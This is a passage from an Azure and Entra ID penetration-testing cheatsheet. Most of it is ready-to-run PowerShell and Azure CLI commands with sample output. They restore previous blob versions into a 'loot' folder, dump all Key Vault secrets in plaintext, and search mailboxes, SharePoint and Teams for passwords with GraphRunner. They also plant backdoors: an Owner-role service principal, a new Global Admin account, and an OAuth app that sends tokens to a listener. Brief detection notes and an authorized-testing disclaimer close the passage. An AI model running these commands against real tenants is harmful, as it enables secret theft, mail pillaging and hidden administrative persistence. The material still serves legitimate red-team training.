  --query "[].{Name:name,VersionId:versionId,Current:isCurrentVersion,Deleted:deleted,LastModified:properties.lastModified,Size:properties.contentLength}" `
  -o table
```

_Sample output:_

```text
Name               VersionId                     Current   Deleted   LastModified              Size
-----------------  ----------------------------  --------  --------  ------------------------  ----------
db-2026-06-01.bak  2026-06-01T02:14:09.0000000Z True      False     2026-06-01T02:14:09Z      1048576000
db-2026-06-01.bak  2026-05-31T22:48:33.0000000Z False     False     2026-05-31T22:48:33Z      1048576000
web.config         2026-05-18T09:30:11.0000000Z False     False     2026-05-18T09:30:11Z      2048
```

```powershell
# Pull data from a previous blob version
az storage blob download --account-name target.comstorage --container-name backups `
  --name db-2026-06-01.bak `
  --version-id "2026-05-31T22:48:33.0000000Z" `
  --file ./loot/db-previous-version.bak `
  --auth-mode login

# Review deleted blobs and versions if soft delete/versioning is enabled
az storage blob list --account-name target.comstorage --container-name backups `
  --include d v --auth-mode login -o table
```

### Key Vault secrets / certs

```powershell
foreach ($v in Get-AzKeyVault) {
    foreach ($s in Get-AzKeyVaultSecret -VaultName $v.VaultName) {
        "{0}/{1} = {2}" -f $v.VaultName, $s.Name, (Get-AzKeyVaultSecret -VaultName $v.VaultName -Name $s.Name -AsPlainText)
    }
}
```

_Sample output:_

```text
target.com-kv/SqlAdminPass = S4mple-Sql-Admin-Pass-Redacted!
target.com-kv/StorageConnStr = DefaultEndpointsProtocol=https;AccountName=target.comstorage;AccountKey=...REDACTED...
```

### Mailbox, OneDrive, SharePoint & Teams (GraphRunner)

```powershell
Invoke-SearchMailbox -Tokens $tokens -Terms "password,vpn,secret" -MessageCount 200
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "passwords"
Invoke-SearchTeams   -Tokens $tokens -SearchTerm "credentials"
Invoke-DumpCAPS      -Tokens $tokens     # Conditional Access policies (recon for bypass)
```

_Sample output of `Invoke-SearchMailbox`:_

```text
[*] Searching mailbox for terms: password,vpn,secret
[+] Match in "RE: VPN access" from it-helpdesk@target.com (2026-05-29)
       "...your temporary VPN password is Vpn#Sprixxxxxx ..."
[+] Match in "Prod credentials" from devops@target.com (2026-06-03)
[*] 2 matching messages. Output written to mailbox_results.csv
```

Legacy/manual mailbox dump via Graph (with a captured token):

```powershell
Dump-OWAMailboxViaMSGraphApi -AccessToken $token -mailFolder AllItems
```

### SQL data

Use `Get-AzSqlServerFirewallRule` to confirm reachability (add your IP if you have rights), then connect with `sqlcmd` / `Invoke-Sqlcmd` using AAD or extracted SQL creds and export the in-scope tables.

---

<br>

## 8. Persistence & Backdoors

Assess persistence mechanisms such as app credentials, service principals, role assignments, and OAuth grants; document and remove every artifact.

### Quick commands

```powershell
az ad app credential list --id "<app-id>" -o table
az ad sp credential list --id "<sp-id>" -o table
az role assignment list --all --query "[?principalName!=null].{Principal:principalName,Role:roleDefinitionName,Scope:scope}" -o table
az rest --method GET --uri "https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?`$top=20"
```

```powershell
Get-MgApplication -All | Select-Object DisplayName,AppId,Id
Get-MgServicePrincipal -All | Select-Object DisplayName,AppId,Id
Get-MgDirectoryAudit -Top 20 | Select-Object ActivityDateTime,ActivityDisplayName,Result
Get-AzRoleAssignment | Select-Object DisplayName,RoleDefinitionName,Scope
```


### Backdoor service principal with a high-privilege role

```powershell
$spn = New-AzADServicePrincipal -DisplayName "WebService"
New-AzRoleAssignment -ApplicationId $spn.AppId -RoleDefinitionName "Owner" -Scope "/subscriptions/d8d9e3f0-..."
```

_Sample output of `New-AzADServicePrincipal`:_

```text
DisplayName   Id                                     AppId
-----------   --                                     -----
WebService    33334444-eeee-ffff-0000-aabbccxxxxxx   55556666-aaaa-bbbb-cccc-123456xxxxxx
```

```powershell
# Log in later as the SP
$cred = New-Object System.Management.Automation.PSCredential ($spn.AppId, (ConvertTo-SecureString $secret -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant "8f7e2c1a-..."
```

### New user + Global Admin via Graph

```powershell
az ad user create --display-name "Svc Account" --password "<password>" --user-principal-name "svc@target.onmicrosoft.com"
# Assign Global Administrator (role template ID 62e90394-69f5-4237-9190-012177xxxxxx)
$Body="{'principalId':'<user-object-id>','roleDefinitionId':'62e90394-69f5-4237-9190-012177xxxxxx','directoryScopeId':'/'}"
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments `
  --headers "Content-Type=application/json" --body $Body
```

### App-registration / OAuth persistence (GraphRunner)

```powershell
Invoke-InjectOAuthApp -AppName "Service Health" -Scope "Mail.Read offline_access" -ReplyUrl https://your-listener/
```

### Add credentials to an existing app/SP

```powershell
az ad app credential reset --id <app-id> --append    # add a secret without removing existing ones
```

---

## Tooling Reference

| Tool | Use | Source |
|---|---|---|
| **Az PowerShell** | Native Azure subscription and resource management | [Azure/azure-powershell](https://github.com/Azure/azure-powershell) |
| **Azure CLI** | Native Azure CLI for ARM, Entra ID, storage, SQL, and automation tasks | [Azure/azure-cli](https://github.com/Azure/azure-cli) |
| **Microsoft Graph PowerShell SDK** (`Connect-MgGraph`) | Modern Entra ID / M365 enumeration and Graph actions | [microsoftgraph/msgraph-sdk-powershell](https://github.com/microsoftgraph/msgraph-sdk-powershell) |
| **Microsoft Entra PowerShell** | Microsoft Entra administration and identity operations | [microsoftgraph/entra-powershell](https://github.com/microsoftgraph/entra-powershell) |
| **AADInternals** | Microsoft 365 / Entra ID research, enumeration, and tenant analysis | [Gerenios/AADInternals](https://github.com/Gerenios/AADInternals) |
| **MicroBurst** | Recon, blob enumeration, and `Get-AzPasswords` credential pillaging | [NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst) |
| **cloud_enum** | Public cloud asset enumeration across Azure, AWS, and GCP naming patterns | [initstring/cloud_enum](https://github.com/initstring/cloud_enum) |
| **GraphRunner** | Graph post-exploitation: recon, consent attacks, mailbox/Teams/SharePoint pillaging, persistence | [dafthack/GraphRunner](https://github.com/dafthack/GraphRunner) |
| **MSOLSpray** | Entra ID / O365 password spraying with user validation | [dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray) |
| **TokenTactics** | Device-code auth and token manipulation assessment | [rvrsh3ll/TokenTactics](https://github.com/rvrsh3ll/TokenTactics) |
| **ROADtools** | Entra ID enumeration framework (`roadrecon`) | [dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools) |
| **AzureHound** | Azure + Entra relationship collection for BloodHound | [SpecterOps/AzureHound](https://github.com/SpecterOps/AzureHound) |
| **BloodHound** | Attack-path analysis and graph visualization | [SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound) |
| **PowerZure** | Azure post-exploitation toolkit | [hausec/PowerZure](https://github.com/hausec/PowerZure) |
| **ScoutSuite** | Multi-cloud configuration auditing | [nccgroup/ScoutSuite](https://github.com/nccgroup/ScoutSuite) |
| **TeamFiltration** | O365 enumeration, spraying, and exfiltration workflows | [Flangvik/TeamFiltration](https://github.com/Flangvik/TeamFiltration) |
| **kubectl** | Kubernetes cluster and pod interaction during AKS assessments | [kubernetes/kubectl](https://github.com/kubernetes/kubectl) |

---

## Defensive / Detection Notes

The same actions leave these signals — useful for the report's blue-team section:

- **Sign-in logs** surface spray patterns (many users, one IP), legacy-auth use, and device-code grants. Alert on device-code flows from unmanaged devices.
- **Conditional Access** with phishing-resistant MFA blocks most spray/device-code initial access; report gaps surfaced by `Invoke-DumpCAPS`.
- **Audit logs** record SP credential resets, new role assignments (especially Global Admin), app consent grants, and guest invitations — high-value alerts.
- **Key Vault** access-policy/RBAC changes and `SecretGet` spikes indicate secret theft.
- **Resource Graph / Defender for Cloud** can flag publicly exposed storage and over-permissioned identities before an attacker finds them.
- Disable unused **legacy auth**; restrict **user app-consent** and **guest invite** rights.

---

## References

### Guides and methodology
- CloudBreach - Breaching Azure: https://cloudbreach.io/courses/breaching-azure
- CloudBreach - Breaching Azure Advanced: https://cloudbreach.io/courses/breaching-azure-advanced
- MITRE ATT&CK — Cloud matrices: https://attack.mitre.org/matrices/enterprise/cloud/
- Microsoft Azure Threat Research Matrix: https://microsoft.github.io/Azure-Threat-Research-Matrix/
- Microsoft — MSOnline/AzureAD PowerShell retirement guidance: https://learn.microsoft.com/powershell/azure/active-directory/migration-faq

---

*Compiled for authorized security testing and education. All sample output is fictional and redacted. Verify every command against current Microsoft documentation before use — Azure APIs, module cmdlets, and tool syntax change frequently.*

> Found a sharp command that belongs here? Don’t let it sit in your terminal history collecting dust — open a pull request and help make this cheatsheet more dangerous to bad configs and more useful to good operators. 🦊⚡
